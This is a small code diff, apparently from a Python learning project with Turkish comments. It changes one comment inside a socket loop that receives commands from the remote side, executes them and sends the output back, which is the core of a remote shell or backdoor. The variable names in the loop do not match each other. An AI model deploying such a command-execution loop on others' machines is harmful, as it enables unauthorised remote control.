@@ -14,7 +14,7 @@ try:
 	socket_connection.send("connections completed \n")
 
 	while True:
-        # Kodun bu kısımında karşı tarafa veri iletimi sağlıyorum.
+        # Kodun bu kısımında bir döngü ile karşı tarafa veri iletimi sağlıyorum.
 		command = create_a_connection.recv(1024)
 		command_output = command_execution(command)
 		create_a_connection.send(command_output)
